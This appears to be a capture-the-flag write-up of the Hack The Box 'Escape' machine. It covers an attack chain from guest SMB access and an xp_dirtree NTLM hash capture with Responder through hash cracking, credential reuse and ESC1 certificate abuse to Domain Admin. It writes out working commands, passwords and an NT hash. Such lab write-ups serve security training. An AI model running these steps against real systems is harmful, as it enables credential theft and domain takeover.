summary:  Guest Logon enumeration leads to early access to an SQL Server which allows for performing an NTLM Relay attack that captures a crackable hash. Using the valid credentials to find other credentials of another user in a backup log file. Elevating to Domain Admin by enumerating vulnerable certificate templates that reveal the current template is vulnerable to ESC1

Scanning shows that a CA Certificate is present, quite possibly is what we have to deal with privesc later on. Other than that,
there seems to be an MSSQL Server present.

## Enumeration

```
❯ nxc smb 10.129.228.253 -u 'a' -p '' --users
```

![Description](/static/images/htb/windows/escape/1.jpg)

Guest logon is enabled, enumerate shares

```
❯ smbclient -L 10.129.228.253 -U a%
```

![Description](/static/images/htb/windows/escape/2.jpg)

Observe there is a non-default share, `Public`. Inside the share, we can find a PDF file titled `SQL Server Procedures.pdf`

![Description](/static/images/htb/windows/escape/3.jpg)

The PDF reveals almost everyone's usernames but at the bottom we have a valid username and password. It also hints that
the credentials only work for MSSQL authentication

![Description](/static/images/htb/windows/escape/4.jpg)

let us verify them

```
❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth
```

![Description](/static/images/htb/windows/escape/5.jpg)

yes, valid now let us try to query available databases

```
❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

![Description](/static/images/htb/windows/escape/6.jpg)

Okay querying works, let us try to get code execution by using `xp_cmdshell` option

```
❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth -x whoami
```

![Description](/static/images/htb/windows/escape/7.jpg)

Doesn't work, which means our user does not have System Administrator (sa) rights, but we can try other methods hehe. But
first, we can brute force the RID on the target to get valid username logons

```
❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth --rid-brute
```

![Description](/static/images/htb/windows/escape/8.jpg)

We can put them in a file called `usernames.txt`. Going forward with our attack, we can try to perform a common attack method
which is Relaying NTLM to MSSQL or "ntlm-relay attack" just for short

---

## NTLM Relay

https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/

The above link is a fantastic article on trying the attack out and what to look for in the same situation. I will use it as my reference

![Description](/static/images/htb/windows/escape/article.png)

In our current situation, we can perform queries but not code execution, we can try to trigger the `xp_dirtree` command to autheticate to our SMB server
and listen for upcoming connections to capture the NTLM hash

The article also mentions a custom-tool they made that can be used to perform checks and auto pwn the MSSQL server:

https://github.com/CompassSecurity/mssqlrelay

Unfortunately, it didnt work for me. So I just used good old Responder. First we need to get an SQL shell, we can use impacket's
`mssqlclient` to do this

```
❯ impacket-mssqlclient PublicUser@sequel.htb
```

Then we turn on Responder on another tab

```
❯ sudo responder -I tun0 -v
```

Make sure the SMB server options is enabled

![Description](/static/images/htb/windows/escape/9.jpg)

Then we execute the `xp_dirtree` command with this syntax

```sql
EXEC master.sys.xp_dirtree '\\10.10.14.72\pwned',1, 1
```

Now, we check our Responder and see that the NTLM hash has been captured for user `sql_svc`

![Description](/static/images/htb/windows/escape/10.jpg)

---

## Cracking

Proceed to crack his hash

```
❯ hashcat -a 0 -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
```

Anddd we have the password

![Description](/static/images/htb/windows/escape/11.jpg)

Also turns out, we can WinRM inside `sql_svc`

![Description](/static/images/htb/windows/escape/12.jpg)

---

## Gaining Access

```
❯ nxc winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
```

But there was no user flag

![Description](/static/images/htb/windows/escape/13.jpg)

## Lateral Movement

So I kept looking and looking and found the SQLServer folder

![Description](/static/images/htb/windows/escape/14.jpg)

I kept looking into it and found this backup log file inside

![Description](/static/images/htb/windows/escape/15.jpg)

Checked inside and found credentials for user `ryan.cooper`

![Description](/static/images/htb/windows/escape/16.jpg)

Verify them

```
❯ nxc winrm sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
```

![Description](/static/images/htb/windows/escape/17.jpg)

Nice, we can also WinRM inside and get the user flag

```
❯ evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

![Description](/static/images/htb/windows/escape/18.jpg)

---

## Privilege Escalation

Now, let's try to enumerate for vulnerable CA certificate templates

```
❯ certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -stdout -vulnerable
```

![Description](/static/images/htb/windows/escape/20.jpg)
![Description](/static/images/htb/windows/escape/19.jpg)

Nice, the Template Name, `UserAuthentication` is vulnerable to ESC1. This means we can easily request a certificate for the target user
which is `Administrator`

```
❯ certipy req -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
```

![Description](/static/images/htb/windows/escape/21.jpg)

Now that we have the certificate, we can easily authenticate as `Administrator`

```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.228.253'
```

![Description](/static/images/htb/windows/escape/22.jpg)

Nice, using the NT Hash we can WinRM inside and get the root flag

```
❯ evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
